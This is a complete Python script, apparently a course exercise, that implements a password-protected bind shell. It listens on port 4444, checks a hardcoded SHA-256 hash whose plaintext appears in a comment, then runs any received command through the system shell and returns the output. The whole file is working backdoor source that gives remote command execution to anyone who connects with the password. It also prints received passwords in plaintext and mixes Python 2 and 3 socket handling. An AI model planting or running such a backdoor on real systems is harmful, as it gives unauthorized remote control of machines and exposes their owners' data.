# -*- coding: utf-8 -*-
import socket
import subprocess
import hashlib

HOST = ''
PORT = 4444

# SHA256 hash of "week4"
HASHED_PASSWORD = "a76beefa34107f7c2cb32b78f8583b4bf550834075b221fd25c1c691cb3da124"

def start_server():
    print("[SERVER] Initializing...")
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)
    print("[SERVER] Waiting for connection...")

    while True:
        try:
            client, address = server.accept()
            print("[SERVER] Connected to %s" % str(address))

            raw_data = client.recv(1024)

            try:
                password = raw_data.decode('utf-8').strip()
            except:
                password = raw_data.strip()

            print("[LOGIN ATTEMPT] Password received: '%s'" % password)

            try:
                # Force bytes before hashing
                hashed = hashlib.sha256(password.encode('utf-8')).hexdigest()
            except:
                hashed = hashlib.sha256(password).hexdigest()

            print("[DEBUG] Computed hash: %s" % hashed)

            if hashed == HASHED_PASSWORD:
                client.send("success")
                print("[SERVER] Login successful.")
                handle_client(client)
            else:
                client.send("fail")
                print("[SERVER] Login failed. Hash mismatch.")
                client.close()
        except Exception as e:
            print("[SERVER ERROR] %s" % str(e))
            continue

def handle_client(client):
    while True:
        try:
            print("[SERVER] Waiting for command...")
            command = client.recv(1024).strip()
            print("[SERVER] Command received: '%s'" % command)

            if not command or command.lower() == 'exit':
                break

            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            response = out + err
            if not response:
                response = "no stdout"

            client.send(response)
            print("[SERVER] Response sent.")
        except Exception as e:
            print("[COMMAND ERROR] %s" % str(e))
            break

    client.close()
    print("[SERVER] Client disconnected.")

if __name__ == "__main__":
    start_server()
